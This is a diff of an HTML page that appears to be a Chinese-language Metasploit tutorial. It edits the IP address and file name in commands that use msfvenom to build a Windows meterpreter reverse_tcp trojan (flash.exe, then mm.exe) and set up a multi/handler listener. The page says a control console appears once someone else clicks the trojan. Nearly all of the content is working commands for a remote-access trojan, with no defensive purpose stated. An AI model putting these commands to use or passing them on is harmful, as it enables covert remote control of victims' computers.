@@ -97,7 +97,7 @@
          <h4>使用msf的msfvenom工具进行木马的生成语法:</h4>
 		 <h4>msfvenom -p windows/meterpreter/reverse_tcp LHOST=本地IP地址 LPORT=要监听的端口 -f exe -o 程序名称.exe</h4>
 		 <h3>例如:</h3>
-		 <h4>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.3 LPORT=9999 -f exe -o flash.exe</h4>
+		 <h4>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.42.93 LPORT=9999 -f exe -o mm.exe</h4>
 		 <h3>在根目录里生成了一个木马可执行文件</h3>
 		 			<img class="lazy" data-original="img/pww.webp">
 	                <a class = "look" href="img/pww.webp">查看高清大图</a>
@@ -108,7 +108,7 @@
 						<h3>开始监听木马</h3>
 						<h4>use exploit/multi/handler <span style = "color:green">//使用这个模块</span></h4>
 						<h4>set playload windows/meterpreter/reverse_tcp<span style = "color:green">//设置攻击负荷</span></h4>
-						<h4>set lhost 10.0.0.3<span style = "color:green"> //在这里设置本地的IP地址</span></h4>
+						<h4>set lhost 192.168.42.93<span style = "color:green"> //在这里设置本地的IP地址</span></h4>
 						<h4>set lport 9999<span style = "color:green"> //这里设置端口要和木马设置的端口保持一致</span></h4>
 						<h4>exploit<span style = "color:green">//开始攻击</span></h4>
 						<h3>木马处于监听状态 等到别人点击木马了你这里就会出现控制台</h3>
